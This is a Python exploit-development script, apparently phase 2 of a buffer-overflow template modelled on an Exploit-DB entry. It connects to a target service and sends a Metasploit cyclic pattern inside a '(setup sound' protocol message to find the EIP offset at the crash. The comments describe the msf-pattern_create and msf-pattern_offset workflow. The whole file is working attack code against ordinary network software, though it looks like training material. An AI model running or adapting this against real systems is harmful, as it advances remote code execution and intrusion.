#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 2: Find the offset of EIP at the time of the crash

# ------------------------------------------------------------------
# How do we find the offset?
# ------------------------------------------------------------------
# Use pattern_create to create pattern to inject
# /usr/bin/msf-pattern_create -l <injection length that crashed service but controlled EIP>
# Crash the service with this payload and note value of EIP
# Use pattern_offset to find offset of EIP from beginning of injection
# /usr/bin/msf-pattern_offset -q <value in EIP at time of crash>
#
# Example:
#   /usr/bin/msf-pattern_create -l 4379 > /tmp/pattern
#   python3 2-find-eip-offset.py 192.168.56.32 13327 /tmp/pattern

if len(sys.argv) != 4:
    print()
    print("Usage: {} <target ip> <target port> <initial payload size> <number of payloads> <payload increment>".format(sys.argv[0]))
    print("\ttarget ip: Remote hostname or IP address of target service")
    print("\ttarget port: Remote port of target sevice")
    print("\tpattern file location: Location of file created with msf-pattern_create")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
PATTERN_FILE_LOCATION = 3

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_pattern_file_location: str = sys.argv[PATTERN_FILE_LOCATION]

with open(l_pattern_file_location, 'r') as l_file:
    l_pattern = l_file.read().replace('\n', '')

try:
    # Create a TCP (socket)
    print("Connecting to {} port {}".format(l_rhost, l_rport))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((l_rhost, l_rport))
    print("Connected")
except:
    print("Could not connect to {} port {}".format(l_rhost, l_rport))
    exit(0)

try:
    # Send the message via the socket using the specific protocol
    print("Sending payload of length {}".format(len(l_pattern)))
    l_bytes = b'\x11' + '(setup sound '.encode() + l_pattern.encode() + b'\x90\x00' + '#'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send payload")

time.sleep(1)
s.close()
